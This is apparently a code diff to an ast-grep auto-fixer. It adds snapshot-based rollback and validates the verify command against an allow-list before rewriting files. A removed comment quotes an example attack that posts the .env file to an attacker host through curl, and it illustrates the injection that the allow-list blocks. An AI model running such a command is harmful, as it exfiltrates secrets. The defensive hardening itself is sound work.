@@ -60,114 +60,122 @@ export class AstGrepAutoFixer {
   }
 
   /**
-   * Applies a specific AST rule to rewrite code deterministically.
-   * Uses ast-grep (sg) underneath.
+   * Runs an ast-grep scan WITHOUT modifying files to discover which files a rule matches.
+   * This lets us snapshot originals before rewriting so we can revert without git.
    */
-    async applyFix(ruleId: string, rulePath: string, verifyCommand?: string): Promise<AutoFixResult> {
+  private async discoverMatches(ruleId: string, rulePath: string): Promise<string[]> {
+    let stdout = '';
+    try {
+      const result = await execFileAsync('npx', ['sg', 'scan', '--rule', rulePath, '--json', this.workspaceRoot]);
+      stdout = result.stdout;
+    } catch (execErr: any) {
+      stdout = execErr.stdout || '';
+    }
+    const files = new Set<string>();
+    if (stdout.trim()) {
+      try {
+        const matches = JSON.parse(stdout);
+        if (Array.isArray(matches)) {
+          matches.forEach((m: any) => { if (m.file) files.add(m.file); });
+        }
+      } catch (parseErr) {
+        logger.warn(`Could not parse ast-grep discovery JSON for rule ${ruleId}: ${parseErr}`);
+      }
+    }
+    return Array.from(files);
+  }
+
+  /**
+   * Restores files from in-memory snapshots taken before the rewrite.
+   * Git-independent: works in non-git checkouts where `git checkout` silently failed
+   * and previously left broken auto-fixes in place.
+   */
+  private restoreSnapshots(snapshots: Map<string, string | null>): void {
+    for (const [absPath, content] of snapshots) {
+      if (content === null) continue; // file did not exist before the fix
+      try {
+        fs.writeFileSync(absPath, content);
+      } catch (revertErr: any) {
+        logger.error(`Failed to restore ${absPath}: ${revertErr.message}`);
+      }
+    }
+  }
+
+  /**
+   * Applies a specific AST rule to rewrite code deterministically (ast-grep / sg),
+   * guarded by a snapshot-based test-driven rollback loop.
+   */
+  async applyFix(ruleId: string, rulePath: string, verifyCommand?: string): Promise<AutoFixResult> {
     logger.info(`Running AST auto-fixer for rule: ${ruleId}`);
     try {
-      // --update-all forces ast-grep to rewrite the files inline based on the fix payload in the YAML
-      // --json outputs the matched files so we know what was changed
-      let stdout = '';
-      let stderr = '';
-      
-      try {
-        const result = await execFileAsync('npx', ['sg', 'scan', '--rule', rulePath, '--update-all', '--json', this.workspaceRoot]);
-        stdout = result.stdout;
-        stderr = result.stderr;
-      } catch (execErr: any) {
-        // ast-grep exits with a non-zero code if it finds matches OR if there's an error.
-        // We capture the output and parse it.
-        stdout = execErr.stdout || '';
-        stderr = execErr.stderr || '';
+      // 1. Discover matches without mutating anything.
+      const filesList = await this.discoverMatches(ruleId, rulePath);
+      if (filesList.length === 0) {
+        return { ruleId, success: true, filesFixed: [], reverted: false };
       }
 
-      // Parse JSON output to extract files that were rewritten
-      const filesFixed = new Set<string>();
-      if (stdout.trim()) {
+      // 2. Snapshot originals so revert never depends on git being present.
+      const snapshots = new Map<string, string | null>();
+      for (const file of filesList) {
+        const abs = path.resolve(this.workspaceRoot, file);
         try {
-          // ast-grep JSON output is an array of matches
-          const matches = JSON.parse(stdout);
-          if (Array.isArray(matches)) {
-             matches.forEach(m => {
-                 if (m.file) filesFixed.add(m.file);
-             });
-          }
-        } catch (parseErr) {
-          logger.warn(`Could not parse ast-grep JSON output for rule ${ruleId}: ${parseErr}`);
+          snapshots.set(abs, fs.readFileSync(abs, 'utf8'));
+        } catch {
+          snapshots.set(abs, null);
         }
       }
 
-      const filesList = Array.from(filesFixed);
-
-      if (filesList.length > 0) {
-        logger.info(`AST Fix applied tentatively for ${ruleId} in ${filesList.length} file(s).`);
-
-        // Test-Driven Rollback Loop
-        if (verifyCommand) {
-          // SECURITY PATCH: Whitelist verification commands to prevent Arbitrary Code Execution (RCE)
-          // If an attacker modifies .dat.config.yaml in a PR to set `verifyCommand: "curl -d @.env attacker.com"`, 
-          // we block it here.
-          const allowedCommands = ['npm test', 'pytest', 'go test ./...', 'cargo test', 'mvn test', 'gradle test', 'dotnet test'];
-          if (!allowedCommands.includes(verifyCommand)) {
-             logger.error(`SECURITY ALERT: Attempted to run unauthorized verify command: ${verifyCommand}. Blocking execution.`);
-             throw new Error('Unauthorized verify command. Only standard test frameworks are allowed.');
-          }
-
-          logger.info(`Verifying fix for ${ruleId} using secure command: "${verifyCommand}"`);
-          try {
-            const [baseCmd, ...args] = verifyCommand.split(' ');
-            await execFileAsync(baseCmd, args, { cwd: this.workspaceRoot, timeout: 60000 }); // Added 60s timeout to prevent DoS
-            logger.info(`Verification passed for ${ruleId}. Fix accepted.`);
-          } catch (verifyErr: any) {
-            logger.warn(`Verification failed for ${ruleId}. Reverting ${filesList.length} file(s)...`);
-            
-            // Revert each file using git restore
-            for (const file of filesList) {
-              try {
-                // Ensure we handle absolute and relative paths correctly
-                const targetFile = path.resolve(this.workspaceRoot, file);
-                await execFileAsync('git', ['checkout', '--', targetFile]);
-              } catch (revertErr: any) {
-                logger.error(`Failed to revert ${file}: ${revertErr.message}`);
-              }
-            }
-
-            return {
-              ruleId,
-              success: false,
-              filesFixed: filesList,
-              reverted: true,
-              error: `Verification command failed: ${verifyErr.message}`
-            };
-          }
-        } else {
-          logger.warn(`No verifyCommand available for this ecosystem. Reverting ${filesList.length} file(s) to guarantee build stability.`);
-          for (const file of filesList) {
-             try {
-                const targetFile = path.resolve(this.workspaceRoot, file);
-                await execFileAsync('git', ['checkout', '--', targetFile]);
-             } catch (revertErr: any) {
-                logger.error(`Failed to revert ${file}: ${revertErr.message}`);
-             }
-          }
-          
-          return {
-            ruleId,
-            success: false,
-            filesFixed: filesList,
-            reverted: true,
-            error: 'Missing verification command (verifyCommand is null). Auto-remediation requires a test safety net.'
-          };
-        }
+      // 3. Validate the verify command BEFORE touching the tree. A missing or
+      //    non-whitelisted command means we have no safety net, so we refuse to fix.
+      const allowedCommands = ['npm test', 'pytest', 'go test ./...', 'cargo test', 'mvn test', 'gradle test', 'dotnet test'];
+      if (!verifyCommand) {
+        logger.warn(`No verifyCommand available for this ecosystem. Skipping auto-fix for ${ruleId} (no test safety net).`);
+        return {
+          ruleId,
+          success: false,
+          filesFixed: [],
+          reverted: false,
+          error: 'Missing verification command (verifyCommand is null). Auto-remediation requires a test safety net.'
+        };
+      }
+      if (!allowedCommands.includes(verifyCommand)) {
+        // SECURITY: block RCE via a malicious verifyCommand injected through .dat.config.yaml in a PR.
+        logger.error(`SECURITY ALERT: Attempted to run unauthorized verify command: ${verifyCommand}. Blocking execution.`);
+        return {
+          ruleId,
+          success: false,
+          filesFixed: [],
+          reverted: false,
+          error: 'Unauthorized verify command. Only standard test frameworks are allowed.'
+        };
       }
 
-      return {
-        ruleId,
-        success: true,
-        filesFixed: filesList,
-        reverted: false
-      };
+      // 4. Apply the rewrite.
+      try {
+        await execFileAsync('npx', ['sg', 'scan', '--rule', rulePath, '--update-all', '--json', this.workspaceRoot]);
+      } catch (execErr: any) {
+        // ast-grep exits non-zero when it finds/changes matches; that is expected.
+      }
+      logger.info(`AST Fix applied tentatively for ${ruleId} in ${filesList.length} file(s).`);
+
+      // 5. Verify, reverting from snapshot on failure.
+      logger.info(`Verifying fix for ${ruleId} using secure command: "${verifyCommand}"`);
+      try {
+        const [baseCmd, ...args] = verifyCommand.split(' ');
+        await execFileAsync(baseCmd, args, { cwd: this.workspaceRoot, timeout: 60000 });
+        logger.info(`Verification passed for ${ruleId}. Fix accepted.`);
+        return { ruleId, success: true, filesFixed: filesList, reverted: false };
+      } catch (verifyErr: any) {
+        logger.warn(`Verification failed for ${ruleId}. Reverting ${filesList.length} file(s) from snapshot...`);
+        this.restoreSnapshots(snapshots);
+        return {
+          ruleId,
+          success: false,
+          filesFixed: filesList,
+          reverted: true,
+          error: `Verification command failed: ${verifyErr.message}`
+        };
+      }
     } catch (error: any) {
       logger.error(`AST Auto-fix failed for rule ${ruleId}: ${error.message}`);
       return {
